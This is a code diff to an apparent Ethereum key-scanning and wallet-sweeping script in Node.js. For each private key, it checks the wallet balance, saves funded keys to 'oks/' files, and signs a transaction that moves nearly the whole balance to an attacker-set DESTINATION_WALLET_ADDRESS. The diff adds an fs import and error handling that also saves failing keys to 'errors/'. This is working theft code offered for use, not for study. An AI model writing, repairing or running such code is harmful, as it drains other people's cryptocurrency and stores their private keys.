@@ -7,6 +7,7 @@ const EthereumTx = require('ethereumjs-tx');
 const log = require('ololog').configure({time: true});
 const ansi = require('ansicolor').nice;
 //const runner = require('child_process');
+const fs = require('fs');
 
 const getCurrentGasPrices = async () => {
 	var response = await axios.get('https://ethgasstation.info/json/ethgasAPI.json');
@@ -46,48 +47,56 @@ const run = async () => {
 	if (address[0] !== 0) {
 		address = address.toString('hex');
 		web3.eth.defaultAccount = '0x' + address;
-		var myBalanceWei = web3.eth.getBalance(web3.eth.defaultAccount).toNumber();
-		var myBalance = web3.fromWei(myBalanceWei, 'ether');
-		if (myBalance > 0) {
-			fs.writeFile('oks/' + address + '.txt', privateKey + "\n" + myBalance, function(err) {
-				log (`Save ${address}: ${myBalance} : ${privateKey}`.green);
-				/*if(err) {
-					return console.log(err);
-				}
-				console.log("The file was saved!");*/
-			});
 
-			var gasPrices = await getCurrentGasPrices();
-			gasPrices = gasPrices.high;
-			log(`Your wallet balance is currently ${myBalance} ETH`.green);
-			var amountToSend = Math.floor(myBalance * 0.9999 * 10000) / 10000;
-			log(`Balance to send ${amountToSend} ETH`.green);
-			var nonce = web3.eth.getTransactionCount(web3.eth.defaultAccount);
-			log(`The outgoing transaction count for your wallet address is: ${nonce}`.magenta);
+		try {
+			var myBalanceWei = web3.eth.getBalance(web3.eth.defaultAccount).toNumber();
+			var myBalance = web3.fromWei(myBalanceWei, 'ether');
+			if (myBalance > 0) {
+				fs.writeFile('oks/' + address + '.txt', privateKey + "\n" + myBalance, function(err) {
+					log (`Save ${address}: ${myBalance} : ${privateKey}`.green);
+					/*if(err) {
+						return console.log(err);
+					}
+					console.log("The file was saved!");*/
+				});
 
-			var details = {
-				"to": process.env.DESTINATION_WALLET_ADDRESS,
-				"value": web3.toHex(web3.toWei(amountToSend, 'ether')),
-				"gas": 21000,
-				"gasPrice": gasPrices * 1000000000, // converts the gwei price to wei
-				"nonce": nonce,
-				"chainId": chainId
-			};
-			var transaction = new EthereumTx(details);
-			transaction.sign(Buffer.from(privateKey, 'hex'));
-			var serializedTransaction = transaction.serialize();
+				var gasPrices = await getCurrentGasPrices();
+				gasPrices = gasPrices.high;
+				log(`Your wallet balance is currently ${myBalance} ETH`.green);
+				var amountToSend = Math.floor(myBalance * 0.9999 * 10000) / 10000;
+				log(`Balance to send ${amountToSend} ETH`.green);
+				var nonce = web3.eth.getTransactionCount(web3.eth.defaultAccount);
+				log(`The outgoing transaction count for your wallet address is: ${nonce}`.magenta);
 
-			try {
+				var details = {
+					"to": process.env.DESTINATION_WALLET_ADDRESS,
+					"value": web3.toHex(web3.toWei(amountToSend, 'ether')),
+					"gas": 21000,
+					"gasPrice": gasPrices * 1000000000, // converts the gwei price to wei
+					"nonce": nonce,
+					"chainId": chainId
+				};
+				var transaction = new EthereumTx(details);
+				transaction.sign(Buffer.from(privateKey, 'hex'));
+				var serializedTransaction = transaction.serialize();
+
 				log (`Send ${address}: ${amountToSend} : ${privateKey}`.cyan);
 				var transactionId = web3.eth.sendRawTransaction('0x' + serializedTransaction.toString('hex'));
 				var url = `https://etherscan.io/tx/${transactionId}`;
 				log(url.cyan);
 				log(`Note: please allow for 30 seconds before transaction appears on Etherscan`.magenta);
-			} catch (error) {
-				log (`Fail ${address}: ${amountToSend} : ${privateKey}`);
+			} else {
+				log (`Fail ${address}: ${myBalance} : ${privateKey}`);
 			}
-		} else {
-			log (`Fail ${address}: ${myBalance} : ${privateKey}`);
+		} catch (error) {
+			log (`Error ${address}: ${privateKey}`);
+			fs.writeFile('errors/' + address + '.txt', privateKey, function(err) {
+				log (`Save error ${address} : ${privateKey}`.green);
+				/*if(err) {
+					return console.log(err);
+				}
+				console.log("The file was saved!");*/
+			});
 		}
 	}
 	run();
